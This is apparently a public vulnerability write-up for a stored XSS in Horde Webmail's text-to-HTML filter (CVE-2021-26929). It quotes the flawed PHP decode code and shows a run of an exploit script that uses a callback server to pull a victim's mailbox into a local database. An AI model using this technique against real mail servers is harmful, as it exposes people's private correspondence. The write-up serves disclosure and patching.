An XSS issue was discovered in Horde Groupware Webmail Edition through 5.2.22 (where the Horde_Text_Filter library before 2.3.7 is used). The attacker can send a plain text e-mail message, with JavaScript encoded as a link or email that is mishandled by preProcess in Text2html.php, because bespoke use of `\x00\x00\x00` and `\x01\x01\x01` interferes with XSS defenses.

[source](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26929)

## Details
The issues can be found in /usr/share/php/Horde/Text/Filter/Text2html.php in the preProcess method of the Horde_Text_Filter_Text2html class. The method first looks for URLs and emails within the message and then replaces them with their base64 encoded value surrounded by a specific sentinel `(“\x00\x00\x00” in the case of URLs, and “\x01\x01\x01” in the case of emails)`. This operation is likely performed to escape the htmlspecialchars call on the message that can be seen.
```
$text2 = @htmlspecialchars($text, ENT_COMPAT, $this->_params['charset']); // 1
// ...
$text = $text2;
/* Do in-lining of http://xxx.xxx to link, xxx@xxx.xxx to email. */
if ($this->_params['parselevel'] < self::NOHTML) {
  $text = Horde_Text_Filter_Linkurls::decode($text); // 2 
  if ($this->_params['parselevel'] < self::MICRO_LINKURL) {
    $text = Horde_Text_Filter_Emails::decode($text); // 3 
  }
  if ($this->_params['space2html']) {
    $params = reset($this->_params['space2html']); $driver = key($this->_params['space2html']);
  } else {
    $driver = 'space2html'; $params = array();
  }
  $text = Horde_Text_Filter::filter($text, $driver, $params); 
}
```
## Stored XSS via in-line URLs
At it can be seen that the decode method of the Horde_Text_Filter_Linkurls class is called with the message as the first parameter. The relevant code can be seen below:
```
public static function decode($text)
{
  return preg_replace_callback(
    '/\00\00\00([\w=+\/]*)\00\00\00/', 
    function($hex) {
      return base64_decode($hex[1]); 
    },
    $text); 
}
```
As it can be seen above the method searches and replaces any instance of base64 values surrounded by the `“\x00\x00\x00”` sentinel with it’s base64 decoded value. Such functionality can be used to decode arbitrary base64 within the message, bypassing htmlspecialchars.

## Stored XSS via in-line emails
A similar issue also affects emails found within a message. At [3] it can be seen that the decode method of the Horde_Text_Filter_Emails class with the message as the first parameter. The relevant code can be seen below:
```
public static function decode($text) 
{
  return preg_replace_callback(
    '/\01\01\01([\w=+\/]*)\01\01\01/', 
    function($hex) {
      return base64_decode($hex[1]);
    },
    $text); 
}
```
As it can be seen above, almost the exact code is used to for in-line emails, as for in-line URLs, with the exception that in this case the sentinel is `“\x01\x01\x01”`.

## Conclusion
The exploit provided is designed to target an individual mailbox. When the malicious email is clicked the exploit is triggered, exfiltrating the desired mailbox and deleting itself once the exfiltration is done. Note that the only user interaction needed is for the target to click the malicious email, and also, the vulnerability can be triggered without HTML content being enabled as it is located it the text content functionality. Below a successful run of the exploit can be observed. Note that user credentials are not required for the exploit to work, and in this case the same user and mail server were used to avoid any additional complications. The callback represents the server from which the exploit will be loaded and executed, in this case localhost.
```
$ ./exploit.py --smtp smtp://user@horde.local:p4ssw0rd@horde.local --callback http://127.0.0.1 --target user@horde.local
[*] Waiting for emails...
[+] Received mailbox (67af6a77e6b96829c2cbc6ad14bf5af508367867)
^C
[*] Done
$ sqlite3 database.db
SQLite version 3.32.3 2020-06-18 14:16:19
Enter ".help" for usage hints.
sqlite> select * from mailbox;
67af6a77e6b96829c2cbc6ad14bf5af508367867|From user@horde.local Wed Nov 25 12:14:28 2020 Return-path: <user@horde.local>
Envelope-to: user@horde.local
Delivery-date: Wed, 25 Nov 2020 12:14:28 -0500
Received: from www-data by debian with local (Exim 4.92)
(envelope-from <user@horde.local>)
id 1khyNA-0000ON-E5
for user@horde.local; Wed, 25 Nov 2020 12:14:28 -0500
Received: from [192.168.56.0] ([192.168.56.0]) by horde.local (Horde Framework) with HTTP; Wed, 25 Nov 2020 17:14:28 +0000
Date: Wed, 25 Nov 2020 17:14:28 +0000
Message-ID: <20201125171428.Horde.QK8euNyfDV0Mg7ZnErJG7xo@horde.local> From: user@horde.local
To: user@horde.local
Subject: Test email
User-Agent: Horde Application Framework 5
Content-Type: multipart/alternative; boundary="=_tg6EPuROEoVxyLRA9drJN_j" MIME-Version: 1.0
This message is in MIME format. sqlite>
```

BR @nu11secur1ty
